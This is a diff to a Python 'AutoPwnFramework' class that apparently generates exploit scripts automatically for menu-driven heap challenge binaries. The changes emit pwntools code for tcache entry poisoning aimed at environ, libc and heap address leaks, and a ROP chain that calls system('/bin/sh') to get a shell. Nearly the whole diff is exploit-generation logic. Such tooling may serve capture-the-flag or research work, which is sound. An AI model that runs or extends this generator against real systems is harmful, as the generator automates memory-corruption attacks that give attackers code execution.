@@ -219,40 +219,68 @@ class AutoPwnFramework:
                 op_map[role] = ch
         menu_prompt = interface_map.get("menu_prompt", "b'> '")
 
-        def gen_call(func, args_dict):
-            ch = op_map.get(func)
-            if not ch:
-                return ""
+        # Helper for index mapping
+        max_slots = meta.get("max_slots", 10)
+        idx_registry = {}  # tag -> index
+        free_slots = list(range(max_slots))
+        
+        # Pre-scan IR to find last use of each tag
+        last_use = {}
+        for stage_idx, stage in enumerate(plan.get("stages", [])):
+            for instr_idx, instr in enumerate(stage.get("ir", [])):
+                tag = instr.get("tag")
+                if tag:
+                    last_use[tag] = (stage_idx, instr_idx)
+
+        def get_idx(tag, current_loc):
+            if tag in idx_registry:
+                return idx_registry[tag]
+            if not free_slots:
+                return 0
+            idx = free_slots.pop(0)
+            idx_registry[tag] = idx
+            return idx
+
+        def maybe_free_slot(tag, current_loc):
+            if tag in last_use and last_use[tag] == current_loc:
+                if tag in idx_registry:
+                    idx = idx_registry[tag]
+                    if idx not in free_slots:
+                        free_slots.append(idx)
+                        free_slots.sort()
+
+        def gen_call(role, call_args, current_loc):
+            tag = call_args.get("_tag")
+            if call_args.get("idx") is not None:
+                idx = call_args["idx"]
+            elif tag:
+                idx = get_idx(tag, current_loc)
+            else:
+                idx = 0
+            
+            ch = op_map.get(role)
+            if not ch: return ""
             op_info = interface_map.get("operations", {}).get(ch, {})
             steps = op_info.get("steps", [])
-            if not steps:
-                return ""
+            if not steps: return ""
 
-            data = args_dict.get("data", "b'A'")
-            idx = args_dict.get("idx", 0)
             call_parts = [f"sla({menu_prompt}, b'{ch}')"]
             for s in steps:
                 arg = s.get("arg", "")
                 prompt = s.get("prompt", "b': '")
-                typ = s.get("type", "bytes")
                 if arg == "idx":
                     call_parts.append(f"sla({prompt}, str({idx}).encode())")
                 elif arg == "size":
-                    call_parts.append(f"sla({prompt}, str({args_dict.get('size', hex(main_size))}).encode())")
+                    call_parts.append(f"sla({prompt}, str({call_args.get('size', hex(main_size))}).encode())")
                 elif arg == "data":
-                    call_parts.append(f"sa({prompt}, {data})")
-            return "\n".join(p for p in call_parts)
-
-        # Index tracking
-        idx_counter = [0]
-        idx_registry = {}
-        def alloc_idx(tag):
-            if tag not in idx_registry:
-                idx_registry[tag] = idx_counter[0]
-                idx_counter[0] += 1
-            return idx_registry[tag]
-        def lookup_idx(tag):
-            return alloc_idx(tag)
+                    data = call_args.get("data", "b'A'")
+                    if prompt == "b''":
+                        call_parts.append(f"p.send({data})")
+                    else:
+                        call_parts.append(f"sa({prompt}, {data})")
+            
+            if tag: maybe_free_slot(tag, current_loc)
+            return "\n".join(call_parts)
 
         # Header
         lines.append("#!/usr/bin/env python3")
@@ -295,7 +323,10 @@ class AutoPwnFramework:
                     if typ == "int":
                         lines.append(f"    sla({prompt}, str({arg}).encode())")
                     else:
-                        lines.append(f"    sa({prompt}, {arg})")
+                        if prompt == "b''":
+                            lines.append(f"    p.send({arg})")
+                        else:
+                            lines.append(f"    sa({prompt}, {arg})")
                 lines.append("")
         lines.append("")
         if has_safe_linking:
@@ -308,23 +339,19 @@ class AutoPwnFramework:
         lines.append("")
 
         lines.append("# --- EXPLOIT ---")
-        for stage in plan.get("stages", []):
+        for s_idx, stage in enumerate(plan.get("stages", [])):
             lines.append(f"# STAGE: {stage['name']}")
-            for instr in stage.get("ir", []):
+            for i_idx, instr in enumerate(stage.get("ir", [])):
                 op = instr["op"]
                 tag = instr.get("tag")
-                idx = lookup_idx(tag) if tag else None
+                current_loc = (s_idx, i_idx)
 
                 if op == "ALLOC":
                     data = instr.get("data_expr", "b'A'")
-                    alloc_ch = op_map.get("alloc", "1")
-                    alloc_info = interface_map.get("operations", {}).get(alloc_ch, {})
-                    sig = alloc_info.get("steps", [])
-                    call_args = {"idx": idx, "data": data}
-                    for s in sig:
-                        if s.get("arg") == "size":
-                            call_args["size"] = hex(instr.get("size", main_size))
-                    lines.append(gen_call("alloc", call_args))
+                    call_args = {"_tag": tag, "data": data, "size": instr.get("size", main_size)}
+                    if "idx" in instr:
+                        call_args["idx"] = instr["idx"]
+                    lines.append(gen_call("alloc", call_args, current_loc))
 
                 elif op == "ALLOC_ROP":
                     if pop_rdi is not None:
@@ -346,49 +373,71 @@ class AutoPwnFramework:
                     lines.append("    p64(binsh),")
                     lines.append(f"    p64(libc.address + {hex(system_off)})")
                     lines.append("])")
-                    lines.append(gen_call("alloc", {"idx": idx, "data": "payload"}))
+                    call_args = {"_tag": tag, "data": "payload", "size": instr.get("size", main_size)}
+                    if "idx" in instr:
+                        call_args["idx"] = instr["idx"]
+                    lines.append(gen_call("alloc", call_args, current_loc))
 
                 elif op == "FREE":
-                    # Skip freeing stack/libc chunks (e.g. env_chunk allocated at environ)
-                    if tag == "env_chunk":
-                        # Free fill_e instead (heap chunk) to bump tcache count before r1
-                        fill_e_idx = lookup_idx("fill_e")
-                        if fill_e_idx is not None:
-                            lines.append(f"# free fill_e instead of {tag} (bumps tcache count)")
-                            lines.append(gen_call("free", {"idx": fill_e_idx}))
-                        else:
-                            lines.append(f"# skip FREE {tag} — non-heap chunk")
-                    else:
-                        lines.append(gen_call("free", {"idx": idx}))
+                    call_args = {"_tag": tag}
+                    if "idx" in instr:
+                        call_args["idx"] = instr["idx"]
+                    lines.append(gen_call("free", call_args, current_loc))
 
                 elif op == "EDIT":
                     data = instr.get("data_expr", "p64(0)*2")
-                    lines.append(gen_call("edit", {"idx": idx, "data": data}))
+                    note = instr.get("note", "")
+                    if note.startswith("set_tcache_entry:"):
+                        # Example note: set_tcache_entry:bin=1,addr=target_environ
+                        try:
+                            parts = note.split(":")[1].split(",")
+                            b_idx = int(parts[0].split("=")[1])
+                            addr_expr = parts[1].split("=")[1]
+                            lines.append(f"payload = bytearray(b'\\x00' * 0x80)")
+                            lines.append(f"payload[{b_idx}*2] = 7")
+                            lines.append(f"payload += b'\\x00' * ({b_idx} * 8)")
+                            lines.append(f"payload += p64({addr_expr})")
+                            data = "bytes(payload)"
+                            call_args = {"_tag": tag, "data": data}
+                        except Exception:
+                            pass
+                    else:
+                        call_args = {"_tag": tag, "data": data}
+                    if "idx" in instr:
+                        call_args["idx"] = instr["idx"]
+                    lines.append(gen_call("edit", call_args, current_loc))
 
                 elif op == "VIEW":
                     save_as = instr.get("save_as", "tmp")
                     note = instr.get("note", "")
-                    lines.append(gen_call("view", {"idx": idx}))
+                    call_args = {"_tag": tag}
+                    if "idx" in instr:
+                        call_args["idx"] = instr["idx"]
+                    lines.append(gen_call("view", call_args, current_loc))
                     # Handle different view output formats
                     view_fmt = interface_map.get("features", {}).get("view_output_format", "raw")
                     if view_fmt == "prefixed":
-                        lines.append("p.recvuntil(b': ')")
+                        lines.append("p.recvuntil((b'data', b'Data', b'Content', b'says', b'Value', b'Note'), timeout=1)")
+                        lines.append("p.recvuntil(b': ', timeout=1)")
                     elif view_fmt == "key_val":
                         lines.append("p.recvuntil(b'= ')")
+                    
                     if "skip_first_8" in note:
-                        # glibc 2.34+ target shifted to environ-0x18,
-                        # skip 24 bytes (padding + BSS) to reach environ value
+                        # For metadata poisoning or environ leak:
+                        # skip 24 bytes, then read 8 bytes for the value
                         lines.append("p.recvn(24)")
-                        lines.append(f"{save_as} = u64(p.recvn(8))")
-                    elif "skip_A_0x18" in note:
-                        lines.append(f"p.recvuntil(b'A' * 0x18)")
-                        lines.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
+                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
                     elif "read_first_8_bytes" in note:
-                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
+                        # Raw binary: write(1, ptr, 0x30) = 48 bytes, no newline.
+                        # Read all 48 then take first 8 (safe vs 0x0a in data).
+                        lines.append(f"data = p.recvn(48)")
+                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
                     elif "read_first_8_bytes_fd_xor" in note:
-                        lines.append(f"{save_as} = u64(p.recvn(8).ljust(8, b'\\x00'))")
+                        lines.append(f"data = p.recvn(48)")
+                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
                     else:
-                        lines.append(f"{save_as} = u64(p.recvn(6).ljust(8, b'\\x00'))")
+                        lines.append(f"data = p.recvn(48)")
+                        lines.append(f"{save_as} = u64(data[:8].ljust(8, b'\\x00'))")
                     lines.append(f"log.success(f'{save_as}: {{hex({save_as})}}')")
 
                 elif op == "CALC":
@@ -438,7 +487,7 @@ class AutoPwnFramework:
 
     def run(self, use_angr=False):
         print("\n" + "="*60)
-        print("  AUTOPWN FRAMEWORK: Artifact-Assisted Exploit Generation (v3.0)")
+        print("  AUTOPWN FRAMEWORK: Artifact-Assisted Exploit Generation")
         print("="*60)
         print(f"Target: {os.path.basename(self.target)}")
         print(f"Mode: {'angr symbolic' if use_angr else 'DynamoRIO tracing'}")
